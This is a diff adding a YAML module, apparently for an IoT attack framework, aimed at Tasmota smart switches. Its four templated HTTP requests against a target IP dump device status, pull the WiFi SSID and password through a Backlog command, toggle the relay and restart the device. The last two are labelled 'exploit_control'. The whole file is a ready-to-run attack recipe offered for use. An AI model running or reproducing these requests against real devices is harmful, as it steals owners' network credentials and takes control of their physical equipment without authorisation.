@@ -1,0 +1,41 @@
+id: tasmota
+device_type: smart_switch
+vendor: Tasmota
+family: tasmota
+requires:
+  port: 80
+actions:
+  - id: status
+    label: "Get status + firmware"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/cm?cmnd=Status%200"
+          save_as: status
+
+  - id: leak-wifi
+    label: "Leak WiFi SSID + password (Backlog)"
+    category: recon
+    dangerous: false
+    steps:
+      - note: "WifiSsid/WifiPassword in Backlog output; some firmwares patched"
+      - http_request:
+          url: "http://{{target.ip}}/cm?cmnd=Backlog%20WifiSsid;WifiPassword"
+          save_as: backlog
+
+  - id: toggle-power1
+    label: "Toggle Power1"
+    category: exploit_control
+    dangerous: true
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/cm?cmnd=Power1%20TOGGLE"
+
+  - id: restart
+    label: "Restart device"
+    category: exploit_control
+    dangerous: true
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/cm?cmnd=Restart%201"
